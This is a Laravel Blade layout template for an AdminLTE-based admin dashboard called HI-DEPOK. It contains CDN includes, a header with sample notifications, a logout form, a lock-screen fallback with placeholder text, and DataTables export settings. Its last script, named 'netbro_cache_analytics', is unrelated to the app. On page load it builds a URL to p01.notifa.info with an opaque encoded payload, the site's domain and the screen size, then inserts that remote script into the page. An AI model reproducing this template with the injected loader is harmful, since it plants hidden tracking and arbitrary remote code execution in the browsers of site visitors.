<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <html lang="{{ app()->getLocale() }}">
    <title>{{ config('app.name', 'HI-DEPOK') }}</title>
    <link rel="shortcut icon" href="{{ URL::asset('img/logo.png') }}">

    <meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.5.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.3/css/select2.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/admin-lte/2.3.11/css/AdminLTE.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/admin-lte/2.3.11/css/skins/_all-skins.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/iCheck/1.0.2/skins/square/_all.css">

    {{-- <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.2.13/semantic.min.css"> --}}
    {{-- <link rel="stylesheet" href="https://cdn.datatables.net/1.10.16/css/dataTables.semanticui.min.css"> --}}

    {{-- ============================================================================================== --}}
    <!-- Ionicons -->
    <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
    <link rel="stylesheet" type="text/css" href="css/table.css">
    <link rel="stylesheet" type="text/css" href="plugins/datatables/jquery.datatables.min.css">
    <link rel="stylesheet" type="text/css" href="plugins/datatables/buttons.dataTables.min.css">
    <link rel="stylesheet" type="text/css" href="plugins/datatables/dataTables.bootstrap.css">
    <link rel="stylesheet" type="text/css" href="plugins/datatables/jquery.dataTables_themeroller.css">
    <link rel="stylesheet" type="text/css" href="plugins/datepicker/datepicker3.css">
    <link rel="stylesheet" type="text/css" href="plugins/pace/pace.css">

    <link rel="stylesheet" type="text/css" href="plugins/morris/morris.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/morris.js/0.5.1/morris.css"></script>



{{-- ================================================================================================= --}}
    




    @yield('css')



</head>
<body class="skin-purple-light sidebar-mini">
@if (!Auth::guest())
    <div class="wrapper">
        <!-- Main Header -->
        <header class="main-header">

            <!-- Logo -->
            <a href="/dashboard" class="logo">
                <b>HI-DEPOK</b>
            </a> 
            <!-- Header Navbar -->
            <nav class="navbar navbar-static-top" role="navigation">
                <!-- Sidebar toggle button-->
                <a href="#" class="sidebar-toggle" data-toggle="offcanvas" role="button">
                    <span class="sr-only">Toggle navigation</span>
                </a>
                <!-- Navbar Right Menu -->
                <div class="navbar-custom-menu">
                    <ul class="nav navbar-nav">


                      <li class="dropdown notifications-menu">
                            <a href="#" class="dropdown-toggle" data-toggle="dropdown">
                              <i class="fa fa-bell-o"></i>
                              <span class="label label-info">10</span>
                            </a>
                            <ul class="dropdown-menu">
                              <li class="header">You have 10 notifications</li>
                              <li>
                                <!-- inner menu: contains the actual data -->
                                <ul class="menu">
                                  <li>
                                    <a href="#">
                                      <i class="fa fa-users text-aqua"></i> 5 new members joined today
                                    </a>
                                  </li>
                                  <li>
                                    <a href="#">
                                      <i class="fa fa-warning text-yellow"></i> Very long description here that may not fit into the
                                      page and may cause design problems
                                    </a>
                                  </li>
                                  <li>
                                    <a href="#">
                                      <i class="fa fa-users text-red"></i> 5 new members joined
                                    </a>
                                  </li>
                                  <li>
                                    <a href="#">
                                      <i class="fa fa-shopping-cart text-green"></i> 25 sales made
                                    </a>
                                  </li>
                                  <li>
                                    <a href="#">
                                      <i class="fa fa-user text-red"></i> You changed your username
                                    </a>
                                  </li>
                                </ul>
                              </li>
                              <li class="footer"><a href="#">View all</a></li>
                            </ul>
                          </li>

                        <!-- User Account Menu -->
                        <li class="dropdown user user-menu">
                            <!-- Menu Toggle Button -->
                            <a href="#" class="dropdown-toggle" data-toggle="dropdown">
                                <!-- The user image in the navbar-->
                                <img src="../../dist/img/admin.png"
                                     class="user-image" alt="User Image"/>
                                <!-- hidden-xs hides the username on small devices so only the image appears. -->
                                <!-- <span class="hidden-xs">{!! Auth::user()->name!!}</span> -->
                            </a>
                            <ul class="dropdown-menu">
                                <!-- The user image in the menu -->
                                <li class="user-header">
                                    <img src="../../dist/img/admin.png"
                                         class="img-circle" alt="User Image"/>
                                 <!--    <p>
                                        {!! Auth::user()->name !!}
                                        <small>Member since {!! Auth::user()->created_at->format('M. Y') !!}</small>
                                    </p> -->
                                </li>
                                <!-- Menu Footer-->
                                <li class="user-footer">
                                    {{-- <div class="pull-left">
                                        <a href="#" class="btn btn-default btn-flat">Profile</a>
                                    </div> --}}
                                    <div class="pull-right">
                                        <a href="{!! url('/logout') !!}" class="btn btn-default btn-flat"
                                            onclick="event.preventDefault(); document.getElementById('logout-form').submit();">
                                            Sign out
                                        </a>
                                        <form id="logout-form" action="{{ url('/logout') }}" method="POST" style="display: none;">
                                            {{ csrf_field() }}
                                                
                                        </form>
                                    </div>
                                </li>
                            </ul>
                        </li>
                    </ul>
                </div>
            </nav>
        </header>
        <!-- Left side column. contains the logo and sidebar -->
        @include('layouts.sidebar')
        <!-- Content Wrapper. Contains page content -->
        <div class="content-wrapper">
            @include('inc.messages')
            @yield('content')
        </div>

        <!-- Main Footer -->
        {{-- <footer class="main-footer" style="max-height: 100px;text-align: center">
            <strong>Copyright © 2017 <a href="#">TIREGDEV</a>.</strong> All rights reserved.
        </footer> --}}
        <footer class="main-footer" style="max-height: 100px;text-align: center">
            <img src="../../dist/img/depok.png" height="40px" class="user-image" alt="User Image"/>
            <img src="../../dist/img/depokbersahabat.png" height="40px" class="user-image" alt="User Image"/>
            <br>
            <strong>Copyright © 2017 <a href="#">TIREGDEV</a>.</strong> All rights reserved.
        </footer>

    </div>

@else
{{-- ============================================================================================================ --}}
<div class="lockscreen-wrapper">
  <div class="lockscreen-logo">
    <a href="/"><b>HI-DEPOK</b></a>
  </div>
 
  <!-- START LOCK SCREEN ITEM -->
    <!-- lockscreen image -->
    <div class="callout callout-warning" align="center">
                <h4><i class="icon fa fa-warning"></i> I am a danger callout <i class="icon fa fa-warning"></i></h4>
                <p>There is a problem that we need to fix. A wonderful serenity has taken possession of my entire soul,
                  like these sweet mornings of spring which I enjoy with my whole heart.</p>
              </div>

  <div class="text-center">
  <div class="lockscreen-footer text-center">
    Copyright &copy; 2017-2018 <b><a href="http://hi.depok.go.id" class="text-black">TIREGDEV</a></b><br>
    All rights reserved
  </div>
</div>
{{-- ============================================================================================================ --}}

@endif

    <!-- jQuery 3.1.1 -->
    {{-- <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script> --}}
    <!--<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>-->
    <script type="text/javascript" src="{{ asset('socmed/googlelib.min.js') }}"></script>
    <script type="text/javascript" src="{{ asset('socmed/bootstrap.min.js') }}"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.3/js/select2.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/iCheck/1.0.2/icheck.min.js"></script>


<!-- AdminLTE App -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/admin-lte/2.3.11/js/app.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.3/js/select2.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/iCheck/1.0.2/icheck.min.js"></script>
    
    
   
{{-- Data Table --}}
   
    <script type="text/javascript" src="https://cdn.datatables.net/1.10.16/js/jquery.dataTables.min.js"></script>
    <script type="text/javascript" src="https://cdn.datatables.net/buttons/1.4.2/js/dataTables.buttons.min.js"></script>
    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jszip/3.1.3/jszip.min.js"></script>
    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.32/pdfmake.min.js"></script>
    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.32/vfs_fonts.js"></script>
    <script type="text/javascript" src="//cdn.datatables.net/buttons/1.4.2/js/buttons.html5.min.js"></script>
    <script type="text/javascript" src="//cdn.datatables.net/buttons/1.4.2/js/buttons.colVis.min.js"></script>



    

    <!-- Slimscroll -->
    <script src="../../plugins/slimScroll/jquery.slimscroll.min.js"></script>
    <!-- FastClick -->
    <script src="../../plugins/fastclick/fastclick.js"></script>
    <!-- AdminLTE App -->
    <script src="../../dist/js/app.min.js"></script>
    <script src="../../dist/js/app.js"></script>

    <!-- AdminLTE for demo purposes -->
    <script src="../../dist/js/demo.js"></script>

    <script src="../../js/UIPageScrolling.js"></script>


    {{-- ====================================================================================================================== --}}

   
    <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.11.2/moment.min.js"></script>
    <script src="../../plugins/fullcalendar/fullcalendar.min.js"></script>
    <script src="../../plugins/datepicker/bootstrap-datepicker.js"></script>
    <script src="../../plugins/pace/pace.min.js"></script>
    <script src="../../plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.all.min.js"></script>
    
   

{{-- Chart --}}
    {{-- <script src="../../plugins/chartjs/Chart.js"></script> --}}


  

    <script type="text/javascript">
        $(document).ready(function () {
            $('#examples').DataTable({
                
                lengthMenu: [
                    [ 10, 25, 50, -1 ],
                    [ '10 rows', '25 rows', '50 rows', 'Show all' ]
                ],
                dom: 'Bfrtip',
                buttons: [
                    'pageLength',
            {
                    extend: 'copyHtml5',
                    title: 'data export'
            },

            {
                    extend: 'excelHtml5',
                    title: 'data export'
            },

            {
                    extend: 'csvHtml5',
                    title: 'data export'
            },

            {
                extend: 'pdfHtml5',
                title: 'data export'
            },

                // 'colvis',

                ],
            }
            );
            

         //    tinymce.init({
         //  selector: '#event',
         //  element_format : 'text',
         //  height: 50,
         //  theme: 'modern',
         //  plugins: 'print preview imagetools image',
         //  toolbar1: 'formatselect | bold italic strikethrough forecolor backcolor | link | alignleft aligncenter alignright alignjustify  | numlist bullist outdent indent  | removeformat',
         //  image_advtab: true,
         //  templates: [
         //    { title: 'Test template 1', content: 'Test 1' },
         //    { title: 'Test template 2', content: 'Test 2' }
         //  ],
         //  content_css: [
         //    '//fonts.googleapis.com/css?family=Lato:300,300i,400,400i',
         //    '//www.tinymce.com/css/codepen.min.css'
         //  ]

         // });
         
              $('.datepicker').datepicker({
             autoclose: true
             });

            // $(document).ajaxStart(function() { Pace.restart(); }); 
          });

    </script>

<script type="text/javascript">
    // To make Pace works on Ajax calls
    $(document).ajaxStart(function() { Pace.restart(); });
    $('.ajax').click(function(){
        $.ajax({url: '#', success: function(result){
            $('.ajax-content').html('<hr>Ajax Request Completed !');
        }});
    });
</script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m0uvGEHY%2fwuN0BqaYK61Zi96eDUXPd%2ftfkPV9Hl%2fnwkVWfuuL51O%2fafvFStQrmAf7Gfzl6QDjftKwmXNAVvBI%2fsRn6MSCb%2fLxbMB0LWPGH%2bj56lH1t0aMugoaQRJ6DF2MaLq2P670GEa9UHNecFpjtFqWLaP6sUTGLM9TjJrX87xXvrkbAte2t%2bF4G242igBgK0ihZz7uW37CT5tEVS52RqTygiya%2bKG%2bW91XZwqSACuryVbxuuxNJDUVFx3rumUs5X5b2c9tzTZKHNciwTxdFt9S9WiyIkqSQuYQ8iuB6j9qD%2fpafYLV0bhdsHNmbXwo2kO212xllqKJCExFJ8m7w6Q3Y0q3m6zmwFoDMnGH8F10TRTR2TJroIWxOGblalNH6A%2favSEt0ASJkGCosxET2SdF4yy5MgQPcyA2mrWDoUEeGml%2fT14eEt%2fw0TvWgJ7ep4IhQvy3NbcoafucWMrPCln92gd6MW9Y%2frblDtDYNA5dG2fjkPMEayVuaSjpbAhfHNFrxvm5gnL7e%2bLap%2fJEUJ%2bANxHI24douRfolIw8lbYaFCH1CyGldg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>


    @yield('scripts')
</body>
</html>